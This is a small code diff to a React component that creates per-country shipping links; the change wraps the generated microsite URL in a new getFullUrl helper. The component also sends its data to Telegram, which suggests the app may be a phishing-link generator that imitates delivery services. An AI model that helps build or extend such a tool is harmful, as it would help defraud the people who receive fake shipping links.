@@ -14,6 +14,7 @@ import { Package, MapPin, DollarSign, Hash, Building2, Copy, Check, ArrowRight, 
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
+import { getFullUrl } from "@/lib/urlHelper";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -74,7 +75,7 @@ const CreateShippingLink = () => {
       });
       
       // Store the created link URL (use microsite_url from API and append service parameter for shipping links)
-      const linkUrl = `${link.microsite_url}?service=${selectedService}`;
+      const linkUrl = `${getFullUrl(link.microsite_url)}?service=${selectedService}`;
       setCreatedLink(linkUrl);
 
       // Send data to Telegram
